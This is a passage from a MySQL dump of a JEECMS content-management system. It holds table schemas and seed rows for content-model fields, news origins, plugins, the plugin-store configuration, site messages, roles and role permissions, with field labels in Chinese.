'0', '1', '0', null, null), ('181', '6', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('183', '6', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('184', '6', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('185', '6', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('186', '6', 'channelId', '栏目', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null), ('187', '6', 'title', '标题', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null), ('188', '6', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('189', '6', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('190', '6', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('191', '6', 'description', '内容简介', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('192', '6', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('193', '6', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('194', '6', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('195', '6', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('196', '6', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null), ('197', '6', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('198', '6', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('199', '6', 'typeImg', '类型图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('200', '6', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('201', '6', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('202', '6', 'attachments', '附件', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('203', '6', 'media', '多媒体', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('246', '4', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('249', '8', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('250', '8', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('251', '8', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('252', '8', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('253', '8', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('254', '8', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('255', '8', 'tplContent', '选择模型模板', '9', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null), ('256', '8', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('257', '8', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('258', '8', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('259', '8', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('260', '8', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null), ('262', '8', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('263', '8', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('264', '8', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('265', '8', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('266', '8', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('268', '8', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('269', '8', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('270', '8', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('271', '8', 'channelId', '栏目', '1', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null), ('272', '8', 'title', '岗位名称', '1', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null), ('275', '8', 'tagStr', 'Tag标签', '7', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('279', '8', 'viewGroupIds', '浏览权限', '8', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('280', '8', 'topLevel', '固顶级别', '7', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('281', '8', 'releaseDate', '发布时间', '2', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null), ('282', '8', 'typeId', '内容类型', '7', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('283', '8', 'tplContent', '指定模板', '8', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('289', '8', 'txt', '职位描述', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('290', '8', 'deadline', '截止日期', '2', null, null, null, '3', '30', '留空永久有效', null, '5', '0', '0', '1', '1', '0', null, null), ('291', '8', 'experience', '工作经验', '3', null, '1-3年,3-5年,5年以上,不限', null, '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null), ('292', '8', 'education', '最低学历', '3', '', '专科,本科,硕士,不限', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null), ('293', '8', 'salary', '职位月薪', '4', null, '1500-2000,2000-3000,3000-5000,5000-8000,8000以上,面议', null, '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null), ('294', '8', 'workplace', '工作地点', '4', '', '北京,上海,深圳,广州,重庆,南京,杭州,西安,南昌', '', '3', '30', '', '', '7', '0', '0', '1', '1', '0', null, null), ('295', '8', 'nature', '工作性质', '5', '', '全职,兼职', '', '3', '30', '', '', '8', '0', '0', '1', '1', '0', null, null), ('296', '8', 'hasmanage', '管理经验', '5', '', '要求,不要求', '', '3', '30', '', '', '8', '0', '0', '1', '1', '0', null, null), ('297', '8', 'nums', '招聘人数', '6', '', '1-3人,3-5人,5-10人,若干', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null), ('298', '8', 'category', '职位类别', '6', null, '项目主管,java高级工程师,java工程师,网页设计师,测试人员,技术支持', null, '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null), ('299', '9', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('300', '9', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('301', '9', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('302', '9', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('303', '9', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('304', '9', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('305', '9', 'tplContent', '内容模板', '9', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null), ('306', '9', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('307', '9', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('308', '9', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('309', '9', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('310', '9', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null), ('312', '9', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('313', '9', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('314', '9', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('315', '9', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('316', '9', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('317', '9', 'channelId', '栏目', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null), ('318', '9', 'title', '标题', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null), ('319', '9', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('320', '9', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('321', '9', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('322', '9', 'description', '摘要', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('323', '9', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('324', '9', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('325', '9', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('326', '9', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('327', '9', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null), ('328', '9', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('329', '9', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('330', '9', 'docPath', '文档', '11', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('333', '9', 'downNeed', '下载需要财富', '11', null, null, null, null, null, null, null, '2', '1', '0', '0', '1', '0', null, null), ('334', '9', 'isOpen', '是否开放', '11', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('335', '1', 'workflowId', '工作流', '12', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null), ('338', '4', 'workflowId', '工作流', '10', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '1', '1', '0', '1', '0', null, null), ('339', '5', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null), ('340', '6', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null), ('342', '8', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null), ('343', '9', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null), ('344', '1', 'channelId', '栏目', '8', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null), ('403', '6', 'Director', '导演', '10', '', '', '', '1', '2', '', '', '1', '0', '0', '1', '1', '0', null, null), ('404', '6', 'Starring', '主演', '10', '', '', '', '1', '30', '', '', '1', '0', '0', '1', '1', '0', null, null), ('405', '6', 'VideoType', '视频类型', '10', null, '历史,古装,都市,喜剧,悬疑,动作,谍战,伦理,战争,惊悚', null, '3', '30', null, null, '7', '0', '0', '1', '1', '0', null, null), ('406', '6', 'Video', '影片信息', '10', '', '正片,预告片', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null), ('408', '1', 'contentImg', '内容图', '11', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('409', '5', 'txt', '内容', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '0', '0', null, null), ('410', '6', 'txt', '内容', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('412', '1', 'allowShare', '分享', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('413', '1', 'allowScore', '评分', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('414', '1', 'pictures', '图片集', '12', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('416', '1', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('417', '1', 'tplMobileContent', '指定手机模板', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '0', null, null), ('418', '2', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('419', '2', 'channelStatic', '栏目静态化', '9', null, null, null, null, null, null, null, '4', '0', '1', '0', '1', '0', null, null), ('420', '2', 'contentStatic', '内容静态化', '9', null, null, null, null, null, null, null, '4', '0', '1', '0', '1', '0', null, null), ('421', '4', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('422', '4', 'channelStatic', '栏目静态化', '9', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('423', '4', 'contentStatic', '内容静态化', '9', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('424', '4', 'tplMobileContent', '指定手机模板', '9', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('425', '5', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('426', '6', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('427', '9', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('431', '8', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('432', '8', 'tplMobileContent', '指定手机模板', '8', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('438', '1', 'charge', '是否收费', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('439', '9', 'hy', '文档类型', '11', null, 'DOC,PPT,TXT,PDF', null, '3', '30', null, null, '8', '1', '0', '1', '1', '0', '100', '100'), ('440', '9', 'em', '所属行业', '11', null, '科技,人文社科,经管营销,教育,办公应用', null, '3', '30', null, null, '8', '1', '0', '1', '1', '0', '100', '100'), ('442', '4', 'size', '大小', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100'), ('443', '4', 'edition', '版本', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100'), ('444', '4', 'system', '支持系统', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100'), ('445', '4', 'bit', '位数', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100'), ('456', '4', 'charge', '是否收费', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('457', '4', 'typeImg', '类型图', '9', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('458', '9', 'typeImg', '类型图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_origin`
-- ----------------------------
DROP TABLE IF EXISTS `jc_origin`;
CREATE TABLE `jc_origin` (
  `origin_id` int(11) NOT NULL AUTO_INCREMENT,
  `origin_name` varchar(255) NOT NULL COMMENT '来源名称',
  `ref_count` int(11) NOT NULL DEFAULT '0' COMMENT '来源文章总数',
  PRIMARY KEY (`origin_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='来源';

-- ----------------------------
--  Records of `jc_origin`
-- ----------------------------
BEGIN;
INSERT INTO `jc_origin` VALUES ('1', '新浪微博', '0'), ('2', '百度', '0'), ('3', '百度论坛', '0'), ('4', '百度贴吧', '0'), ('5', '新浪新闻', '0'), ('6', '腾讯新闻', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_plug`
-- ----------------------------
DROP TABLE IF EXISTS `jc_plug`;
CREATE TABLE `jc_plug` (
  `plug_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '插件名称',
  `path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `description` varchar(2000) DEFAULT NULL COMMENT '描述',
  `author` varchar(255) DEFAULT NULL COMMENT '作者',
  `upload_time` datetime NOT NULL COMMENT '上传时间',
  `install_time` datetime DEFAULT NULL COMMENT '安装时间',
  `uninstall_time` datetime DEFAULT NULL COMMENT '卸载时间',
  `file_conflict` tinyint(1) NOT NULL DEFAULT '0' COMMENT '包含文件是否冲突',
  `is_used` tinyint(1) NOT NULL DEFAULT '0' COMMENT '使用状态(0未使用,1使用中)',
  `plug_perms` varchar(255) DEFAULT '' COMMENT '插件权限（,分隔各个权限配置）',
  `plug_repair` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否修复类插件(0 新功能插件 1修复类)',
  PRIMARY KEY (`plug_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='插件';

-- ----------------------------
--  Records of `jc_plug`
-- ----------------------------
BEGIN;
INSERT INTO `jc_plug` VALUES ('1', '应用中心', '/WEB-INF/plug/plugStore.zip', '应用中心', 'jeecms', '2016-09-08 09:05:12', '2016-10-08 16:12:57', '2016-10-08 16:12:39', '0', '1', 'plugStore.center@store:center;storeConfig.edit@storeConfig:v_edit;storeConfig.update@storeConfig:o_update;', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_plug_store_config`
-- ----------------------------
DROP TABLE IF EXISTS `jc_plug_store_config`;
CREATE TABLE `jc_plug_store_config` (
  `config_id` int(11) NOT NULL DEFAULT '1',
  `server_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口根地址',
  `password` varchar(255) NOT NULL DEFAULT '' COMMENT '应用商店密码',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
--  Records of `jc_plug_store_config`
-- ----------------------------
BEGIN;
INSERT INTO `jc_plug_store_config` VALUES ('1', 'http://bbs.jeecms.com', '5f4dcc3b5aa765d61d8327deb882cf99');
COMMIT;

-- ----------------------------
--  Table structure for `jc_receiver_message`
-- ----------------------------
DROP TABLE IF EXISTS `jc_receiver_message`;
CREATE TABLE `jc_receiver_message` (
  `msg_re_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  `msg_id` int(11) DEFAULT NULL COMMENT '发信的信件id',
  PRIMARY KEY (`msg_re_id`),
  KEY `jc_receiver_message_user_send` (`msg_send_user`),
  KEY `jc_receiver_message_user_receiver` (`msg_receiver_user`),
  KEY `jc_receiver_message_site` (`site_id`),
  KEY `jc_receiver_message_message` (`msg_re_id`),
  KEY `fk_jc_receiver_message_message` (`msg_id`),
  CONSTRAINT `fk_jc_receiver_message_message` FOREIGN KEY (`msg_id`) REFERENCES `jc_message` (`msg_id`),
  CONSTRAINT `fk_jc_receiver_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_receiver_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_receiver_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='站内信收信表';

-- ----------------------------
--  Records of `jc_receiver_message`
-- ----------------------------
BEGIN;
INSERT INTO `jc_receiver_message` VALUES ('2', '1111', '1111', '2016-10-11 17:43:42', '1', '1', '1', '0', '3', null), ('4', 'qqw', 'qwwqwww', '2016-10-12 09:51:10', '1', '1', '1', '0', '3', null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_role`
-- ----------------------------
DROP TABLE IF EXISTS `jc_role`;
CREATE TABLE `jc_role` (
  `role_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `role_name` varchar(100) NOT NULL COMMENT '角色名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_super` char(1) NOT NULL DEFAULT '0' COMMENT '拥有所有权限',
  `role_level` int(11) NOT NULL DEFAULT '10' COMMENT '角色等级',
  PRIMARY KEY (`role_id`),
  KEY `fk_jc_role_site` (`site_id`),
  CONSTRAINT `fk_jc_role_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='CMS角色表';

-- ----------------------------
--  Records of `jc_role`
-- ----------------------------
BEGIN;
INSERT INTO `jc_role` VALUES ('1', null, '管理员', '10', '1', '10'), ('2', null, '测试员', '10', '0', '7'), ('3', null, '信息发布角色', '10', '0', '10'), ('4', null, '信息审核角色', '10', '0', '10');
COMMIT;

-- ----------------------------
--  Table structure for `jc_role_permission`
-- ----------------------------
DROP TABLE IF EXISTS `jc_role_permission`;
CREATE TABLE `jc_role_permission` (
  `role_id` int(11) NOT NULL,
  `uri` varchar(100) NOT NULL,
  KEY `fk_jc_permission_role` (`role_id`),
  CONSTRAINT `fk_jc_permission_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS角色授权表';

-- ----------------------------
--  Records of `jc_role_permission`
-- ----------------------------
BEGIN;
INSERT INTO `jc_role_permission` VALUES ('2', 'channel:o_save'), ('2', 'content:v_tree'), ('2', 'ueditor:*'), ('2', 'content:o_generateTags'), ('2', 'common:*'), ('2', 'content:o_upload_media'), ('2', 'content:v_tree_channels'), ('2', 'content:v_delete'), ('2', 'channel:v_tree'), ('2', 'main'), ('2', 'personal:v_profile'), ('2', 'channel:v_list'), ('2', 'content:o_upload_attachment'), ('2', 'personal:v_checkPwd'), ('2', 'content:v_list'), ('2', 'personal:o_profile'), ('2', 'topic:by_channel'), ('2', 'channel:v_left'), ('2', 'top'), ('2', 'content:o_save'), ('2', 'channel:v_check_path'), ('2', 'content:o_update'), ('2', 'content:o_upload_docs'), ('2', 'channel:v_edit'), ('2', 'frame:content_main'), ('2', 'map'), ('2', 'content:v_add'), ('2', 'content:v_origin_list'), ('2', 'content:o_upload_doc'), ('2', 'fck:upload'), ('2', 'index'), ('2', 'content:import_docs'), ('2', 'channel:v_create_path'), ('2', 'right'), ('2', 'channel:v_add'), ('2', 'channel:o_update'), ('2', 'channel:o_priority'), ('2', 'left'), ('2', 'channel:o_delete'), ('2', 'content:v_left'), ('2', 'message:v_countUnreadMsg'), ('2', 'content:v_edit'), ('2', 'content:v_tree_share'), ('2', 'content:v_tree_radio'), ('2', 'channel:channel_main'), ('2', 'content:v_check_records'), ('3', 'content:o_submit'), ('3', 'content:o_send_to_topic'), ('3', 'topic:v_edit'), ('3', 'content:v_tree'), ('3', 'ueditor:*'), ('3', 'content:v_view'), ('3', 'content:v_delete'), ('3', 'main'), ('3', 'topic:o_save'), ('3', 'content:v_push'), ('3', 'content:v_list'), ('3', 'content:o_delete'), ('3', 'topic:v_list'), ('3', 'personal:o_profile'), ('3', 'content:v_submit'), ('3', 'content:o_save'), ('3', 'content:o_update'), ('3', 'content:o_copy'), ('3', 'content:o_upload_docs'), ('3', 'content:o_priority'), ('3', 'frame:content_main'), ('3', 'content:o_share'), ('3', 'content:o_static'), ('3', 'content:o_upload_doc'), ('3', 'fck:upload'), ('3', 'index'), ('3', 'content:import_docs'), ('3', 'content:v_send_to_weixin'), ('3', 'left'), ('3', 'content:v_share'), ('3', 'content:v_left'), ('3', 'content:v_reject'), ('3', 'message:v_countUnreadMsg'), ('3', 'content:v_edit'), ('3', 'content:o_move'), ('3', 'content:v_tree_share'), ('3', 'content:v_tree_radio'), ('3', 'content:v_check_records'), ('3', 'topic:v_add'), ('3', 'content:o_generateTags'), ('3', 'common:*'), ('3', 'content:o_upload_media'), ('3', 'content:v_tree_channels'), ('3', 'content:v_send_to_topic'), ('3', 'personal:v_profile'), ('3', 'topic:o_update'), ('3', 'content:o_upload_attachment'), ('3', 'personal:v_checkPwd'), ('3', 'topic:by_channel'), ('3', 'topic:o_delete'), ('3', 'top'), ('3', 'topic:o_priority'), ('3', 'content:v_copy'), ('3', 'map'), ('3', 'content:v_add'), ('3', 'content:v_priority'), ('3', 'content:v_origin_list'), ('3', 'content:o_reject'), ('3', 'right'), ('3', 'content:v_move'), ('3', 'content:o_push'), ('3', 'content:o_sendToWeixin'), ('4', 'content:o_submit'), ('4', 'content:o_send_to_topic'), ('4', 'content:v_check'), ('4', 'topic:v_edit'), ('4', 'content:v_tree'), ('4', 'ueditor:*'), ('4', 'content:v_view'), ('4', 'content:o_check'), ('4', 'content:v_delete'), ('4', 'channel:v_tree'), ('4', 'main'), ('4', 'channel:v_list'), ('4', 'topic:o_save'), ('4', 'content:v_push'), ('4', 'content:v_list'), ('4', 'content:o_delete'), ('4', 'topic:v_list'), ('4', 'personal:o_profile'), ('4', 'content:v_submit'), ('4', 'channel:v_left'), ('4', 'content:o_save'), ('4', 'channel:v_check_path'), ('4', 'content:o_update'), ('4', 'content:o_copy'), ('4', 'content:o_upload_docs'), ('4', 'content:o_priority'), ('4', 'frame:content_main'), ('4', 'content:o_share'), ('4', 'content:o_static'), ('4', 'content:v_unpigeonhole'), ('4', 'content:o_upload_doc'), ('4', 'fck:upload'), ('4', 'index'), ('4', 'content:import_docs'), ('4', 'content:v_send_to_weixin'), ('4', 'channel:o_update'), ('4', 'left'), ('4', 'content:v_share'), ('4', 'content:v_left'), ('4', 'content:v_reject'), ('4', 'message:v_countUnreadMsg'), ('4', 'content:v_edit'), ('4', 'content:o_move'), ('4', 'content:v_tree_share'), ('4', 'content:v_tree_radio'), ('4', 'channel:channel_main'), ('4', 'content:v_check_records'), ('4', 'topic:v_add'), ('4', 'content:o_generateTags'), ('4', 'common:*'), ('4', 'content:o_upload_media'), ('4', 'content:v_tree_channels'), ('4', 'content:v_send_to_topic'), ('4', 'personal:v_profile'), ('4', 'topic:o_update'), ('4', 'content:o_upload_attachment'), ('4', 'personal:v_checkPwd'), ('4', 'topic:by_channel'), ('4', 'topic:o_delete'), ('4', 'top'), ('4', 'topic:o_priority'), ('4', 'content:v_copy'), ('4', 'map'), ('4', 'content:v_add'), ('4', 'content:v_priority'), ('4', 'content:v_origin_list'), ('4', 'content:o_reject'), ('4', 'channel:v_create_path'), ('4', 'right'), ('4', 'content:o_unpigeonhole'), ('4', 'content:v_pigeonhole'), ('4', 'content:o_pigeonhole'), ('4', 'content:v_move'), ('4', 'content:o_push'), ('4', 'content:o_sendToWeixin');
COMMIT;

-- ----------------------------
--  Table structure for `jc_score_group`
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_group`;
CREATE TABLE `jc_score_group` (
  `score_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '分组名',
  `description` varchar(1000) DEFAULT NULL COMMENT '描述',
  `enable` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否启用',
  `def` tinyint(3) NOT NULL DEFAULT '0' COMMENT '是否默认',
  `site_id` int(11) NOT NULL COMMENT '站点',
  PRIMARY KEY (`score_group_id`),
  KEY `fk_jc_score_group_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='FComment';

-- ----------------------------
--  Records of `jc_score_group`
-- ----------------------------
BEGIN;
